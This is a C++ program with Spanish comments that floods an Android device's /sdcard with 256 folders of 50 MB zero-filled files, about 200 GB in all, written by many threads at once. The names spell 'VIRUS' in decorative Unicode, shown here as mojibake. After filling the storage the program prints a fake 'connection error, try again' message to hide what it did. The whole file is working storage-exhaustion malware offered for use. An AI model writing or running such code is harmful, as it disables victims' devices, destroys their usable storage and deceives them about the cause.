#include <iostream>
#include <filesystem>
#include <fstream>
#include <vector>
#include <thread>

namespace fs = std::filesystem;

/* ================= CONFIGURACIÃ“N ================= */

int NUM_CARPETAS = 256;              // CuÃ¡ntas carpetas
int NUM_ARCHIVOS = 16;              // Archivos por carpeta
int TAMANO_MB = 50;                // Peso por archivo
std::string NOMBRE_BASE = "à¦”à§¢âƒ•â¥âƒŸğ‘½ğ‘°ğ‘¹ğ‘¼ğ‘ºğŸœğ‘½ğ‘°ğ‘¹ğ‘¼ğ‘ºá¬¼âƒâƒ•âš ï¸"; // Nombre base
std::string RUTA_BASE = "/sdcard";  // Ruta destino

/* ================================================= */

void crearArchivoGrande(const std::string& ruta, int mb) {
    std::ofstream archivo(ruta, std::ios::binary);

    const size_t bufferSize = 1024 * 1024; // 1MB
    std::vector<char> buffer(bufferSize, 0);

    for (int i = 0; i < mb; i++) {
        archivo.write(buffer.data(), bufferSize);
    }

    archivo.close();
}

void crearCarpeta(int indiceCarpeta) {

    std::string nombreCarpeta = 
        RUTA_BASE + "/" + NOMBRE_BASE + std::to_string(indiceCarpeta);

    fs::create_directory(nombreCarpeta);

    std::vector<std::thread> hilos;

    for (int j = 1; j <= NUM_ARCHIVOS; j++) {

        std::string nombreArchivo = 
            nombreCarpeta + "/" + NOMBRE_BASE + std::to_string(j);

        hilos.emplace_back(crearArchivoGrande, nombreArchivo, TAMANO_MB);
    }

    for (auto& h : hilos) {
        h.join();
    }
}

int main() {

    std::vector<std::thread> hilosCarpetas;

    for (int i = 1; i <= NUM_CARPETAS; i++) {
        hilosCarpetas.emplace_back(crearCarpeta, i);
    }

    for (auto& h : hilosCarpetas) {
        h.join();
    }

    std::cout << "Error de conexiÃ³n intente nuevamente." << std::endl;
    return 0;
}
